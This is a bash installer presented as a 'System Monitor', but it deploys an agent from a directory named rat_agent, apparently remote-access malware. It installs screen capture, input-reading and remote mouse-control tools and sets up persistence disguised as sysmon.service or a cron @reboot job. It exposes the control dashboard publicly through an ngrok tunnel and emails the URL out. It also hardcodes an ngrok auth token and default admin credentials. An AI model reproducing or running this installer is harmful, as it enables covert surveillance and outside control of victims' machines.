#!/bin/bash

################################################################################
# System Monitor - One-Step Installer
#
# Usage:  ./install.sh
#
# This single script:
#   1. Installs all dependencies
#   2. Configures ngrok tunnel
#   3. Sets up auto-start on reboot (systemd or cron)
#   4. Starts everything immediately
#   5. Sends the public URL to your email
################################################################################

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
print_success() { echo -e "${GREEN}[OK]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[WARN]${NC} $1"; }
print_error() { echo -e "${RED}[FAIL]${NC} $1"; }

# Configuration
NGROK_AUTH_TOKEN="3DHUSD9zUxwpnhKjhIlfohEJwGk_2UbPU4mcMNW2ZvrMK3oRx"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

echo ""
echo "================================================================"
echo "              System Monitor - One-Step Installer"
echo "================================================================"
echo ""

# --------------------------------------------------------------------------
# 1. Check Python and pip
# --------------------------------------------------------------------------
print_info "Checking Python..."

PYTHON_CMD="python3"
if ! command -v $PYTHON_CMD &> /dev/null; then
    print_error "Python 3 not found. Install Python 3.8+ first."
    exit 1
fi
print_success "Python: $($PYTHON_CMD --version)"

# Ensure pip is available
if ! $PYTHON_CMD -m pip --version &> /dev/null; then
    print_info "Installing pip..."
    $PYTHON_CMD -m ensurepip --upgrade &> /dev/null || {
        print_error "Could not install pip"
        exit 1
    }
fi
print_success "pip: $($PYTHON_CMD -m pip --version | cut -d' ' -f1-2)"

# --------------------------------------------------------------------------
# 2. Install Python dependencies
# --------------------------------------------------------------------------
print_info "Installing Python dependencies..."

$PYTHON_CMD -m pip install --quiet --user \
    flask flask-socketio requests mss pillow \
    python-socketio python-engineio 2>/dev/null || \
$PYTHON_CMD -m pip install --quiet \
    flask flask-socketio requests mss pillow \
    python-socketio python-engineio || \
print_warning "Some pip packages failed (agent still works)"

# evdev is optional (needs kernel headers) - don't fail if missing
$PYTHON_CMD -m pip install --quiet --user evdev 2>/dev/null || \
    print_warning "evdev skipped (optional - needs kernel headers)"

print_success "Python dependencies installed"

# --------------------------------------------------------------------------
# 2b. Install system tools for remote screen control
# --------------------------------------------------------------------------
print_info "Checking remote screen control tools..."

TOOLS_OK=true

# Check xdotool
if command -v xdotool &> /dev/null; then
    print_success "xdotool: installed"
else
    print_warning "xdotool: not found (mouse control needs this)"
    TOOLS_OK=false
fi

# Check ImageMagick
if command -v import &> /dev/null; then
    print_success "ImageMagick: installed"
else
    print_warning "ImageMagick: not found (fallback capture needs this)"
    TOOLS_OK=false
fi

if [ "$TOOLS_OK" = false ]; then
    print_info "Attempting to install missing tools..."
    print_info "You may need to enter sudo password"
    echo ""
    
    # Detect package manager and install
    if command -v apt-get &> /dev/null; then
        sudo apt-get update -qq 2>/dev/null
        sudo apt-get install -y xdotool imagemagick 2>&1 | grep -v "^\*" | tail -5
    elif command -v dnf &> /dev/null; then
        sudo dnf install -y xdotool ImageMagick 2>&1 | tail -5
    elif command -v pacman &> /dev/null; then
        sudo pacman -S --noconfirm xdotool imagemagick 2>&1 | tail -5
    else
        print_warning "Unknown package manager"
        print_info "Install manually:"
        print_info "  Debian/Ubuntu: sudo apt-get install xdotool imagemagick"
        print_info "  RHEL/Fedora:   sudo dnf install xdotool ImageMagick"
        print_info "  Or run: ./install_tools.sh"
    fi
    
    echo ""
    
    # Verify
    if command -v xdotool &> /dev/null; then
        print_success "xdotool: now installed"
    fi
    
    if command -v import &> /dev/null; then
        print_success "ImageMagick: now installed"
    fi
fi

print_success "System tools check complete"

# --------------------------------------------------------------------------
# 3. Install and configure ngrok
# --------------------------------------------------------------------------
print_info "Setting up ngrok..."

NGROK_PATH="$HOME/.local/bin/ngrok"
mkdir -p "$HOME/.local/bin"

if [ ! -f "$NGROK_PATH" ]; then
    print_info "Downloading ngrok..."
    curl -sL https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz \
        -o /tmp/opencode/ngrok.tgz
    tar -xzf /tmp/opencode/ngrok.tgz -C /tmp/opencode/
    mv /tmp/opencode/ngrok "$NGROK_PATH"
    chmod +x "$NGROK_PATH"
    rm -f /tmp/opencode/ngrok.tgz
    print_success "Ngrok installed"
else
    print_success "Ngrok already installed"
fi

# Write auth token
mkdir -p "$HOME/.config/ngrok"
cat > "$HOME/.config/ngrok/ngrok.yml" <<EOF
authtoken: $NGROK_AUTH_TOKEN
version: "2"
EOF
print_success "Ngrok authenticated"

# --------------------------------------------------------------------------
# 4. Initialize database
# --------------------------------------------------------------------------
print_info "Initializing database..."
$PYTHON_CMD -c "
import sys
sys.path.insert(0, '$SCRIPT_DIR')
from rat_agent.database import init_db
init_db()
" 2>/dev/null || print_warning "Database already initialized"
print_success "Database ready"

# --------------------------------------------------------------------------
# 5. Configure auto-start on reboot
# --------------------------------------------------------------------------
print_info "Configuring auto-start on reboot..."

AUTOSTART_METHOD=""

# Try systemd (system-wide, needs sudo)
if command -v systemctl &> /dev/null && [ "$(id -u)" -eq 0 ]; then
    cat > /etc/systemd/system/sysmon.service <<EOF
[Unit]
Description=System Monitor Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=$(whoami)
WorkingDirectory=$SCRIPT_DIR
ExecStart=$PYTHON_CMD $SCRIPT_DIR/rat_agent/agent.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable sysmon.service 2>/dev/null
    AUTOSTART_METHOD="systemd"
    print_success "Auto-start via systemd"

# Try systemd with sudo
elif command -v systemctl &> /dev/null && sudo -n true 2>/dev/null; then
    cat > /tmp/opencode/sysmon.service <<EOF
[Unit]
Description=System Monitor Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=$(whoami)
WorkingDirectory=$SCRIPT_DIR
ExecStart=$PYTHON_CMD $SCRIPT_DIR/rat_agent/agent.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
    sudo cp /tmp/opencode/sysmon.service /etc/systemd/system/sysmon.service
    sudo systemctl daemon-reload
    sudo systemctl enable sysmon.service 2>/dev/null
    AUTOSTART_METHOD="systemd"
    print_success "Auto-start via systemd (sudo)"

# Fallback: cron @reboot (no sudo needed)
else
    CRON_LINE="@reboot cd $SCRIPT_DIR && $PYTHON_CMD rat_agent/agent.py >> /tmp/opencode/sysmon_agent.log 2>&1 && $PYTHON_CMD dashboard/app.py >> /tmp/opencode/sysmon_dashboard.log 2>&1 & $HOME/.local/bin/ngrok http 5000 >> /tmp/opencode/ngrok.log 2>&1 &"

    # Remove old entries first
    (crontab -l 2>/dev/null | grep -v "sysmon_agent" | grep -v "ngrok http 5000") | crontab - 2>/dev/null || true

    # Add the @reboot job
    (crontab -l 2>/dev/null; echo "@reboot cd $SCRIPT_DIR && nohup $PYTHON_CMD rat_agent/agent.py >> /tmp/opencode/sysmon_agent.log 2>&1 & sleep 5 && nohup $PYTHON_CMD dashboard/app.py >> /tmp/opencode/sysmon_dashboard.log 2>&1 & sleep 5 && nohup $HOME/.local/bin/ngrok http 5000 >> /tmp/opencode/ngrok.log 2>&1 &") | crontab -

    AUTOSTART_METHOD="cron"
    print_success "Auto-start via cron @reboot"
fi

# --------------------------------------------------------------------------
# 6. Stop any existing processes
# --------------------------------------------------------------------------
print_info "Stopping existing processes..."
pkill -f "rat_agent/agent.py" 2>/dev/null || true
pkill -f "dashboard/app.py" 2>/dev/null || true
pkill -f "ngrok http 5000" 2>/dev/null || true
sleep 2

# --------------------------------------------------------------------------
# 7. Start everything now
# --------------------------------------------------------------------------
print_info "Starting System Monitor agent..."
mkdir -p /tmp/opencode
nohup $PYTHON_CMD "$SCRIPT_DIR/rat_agent/agent.py" \
    > /tmp/opencode/sysmon_agent.log 2>&1 &
AGENT_PID=$!

print_info "Starting dashboard..."
nohup $PYTHON_CMD "$SCRIPT_DIR/dashboard/app.py" \
    > /tmp/opencode/sysmon_dashboard.log 2>&1 &
DASHBOARD_PID=$!

print_info "Waiting for dashboard..."
sleep 5

# Verify dashboard
if curl -s -o /dev/null http://127.0.0.1:5000/login; then
    print_success "Dashboard running (PID: $DASHBOARD_PID)"
else
    print_warning "Dashboard may still be starting..."
fi

print_info "Starting ngrok tunnel..."
nohup "$NGROK_PATH" http 5000 > /tmp/opencode/ngrok.log 2>&1 &
NGROK_PID=$!

print_info "Waiting for tunnel..."
sleep 5

# --------------------------------------------------------------------------
# 8. Get public URL
# --------------------------------------------------------------------------
PUBLIC_URL=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | \
    $PYTHON_CMD -c "import sys,json; d=json.load(sys.stdin); print(d['tunnels'][0]['public_url'] if d.get('tunnels') else '')" \
    2>/dev/null || echo "")

if [ -n "$PUBLIC_URL" ]; then
    print_success "Public URL: $PUBLIC_URL"

    # Send URL to email recipients
    print_info "Sending URL to recipients..."
    $PYTHON_CMD -c "
import sys
sys.path.insert(0, '$SCRIPT_DIR')
from rat_agent.emailer import EmailSender
from rat_agent.config import Config
EmailSender(Config()).send_dashboard_url('$PUBLIC_URL')
" 2>/dev/null && print_success "URL sent to recipients" || \
        print_warning "Email rate-limited - URL still active"
else
    print_warning "Could not retrieve ngrok URL"
    print_info "Check: cat /tmp/opencode/ngrok.log"
    PUBLIC_URL="http://localhost:5000"
fi

# --------------------------------------------------------------------------
# Done
# --------------------------------------------------------------------------
echo ""
echo "================================================================"
echo "                    Installation Complete"
echo "================================================================"
echo ""
echo "  Public URL:  $PUBLIC_URL"
echo "  Local URL:   http://localhost:5000"
echo "  Login:       admin / rat_admin_2024"
echo ""
echo "  Running processes:"
echo "    Agent PID:      $AGENT_PID"
echo "    Dashboard PID:  $DASHBOARD_PID"
echo "    Ngrok PID:      $NGROK_PID"
echo ""
echo "  Auto-start method: $AUTOSTART_METHOD"
echo "  Survives reboot:   Yes"
echo ""
echo "  Logs:"
echo "    Agent:     tail -f /tmp/opencode/sysmon_agent.log"
echo "    Dashboard: tail -f /tmp/opencode/sysmon_dashboard.log"
echo "    Ngrok:     tail -f /tmp/opencode/ngrok.log"
echo ""
echo "  Stop:   pkill -f 'rat_agent/agent.py'; pkill -f 'dashboard/app.py'; pkill -f 'ngrok http'"
echo "  Start:  cd $SCRIPT_DIR && nohup python3 rat_agent/agent.py & nohup python3 dashboard/app.py & nohup ~/.local/bin/ngrok http 5000 &"
echo ""
echo "================================================================"
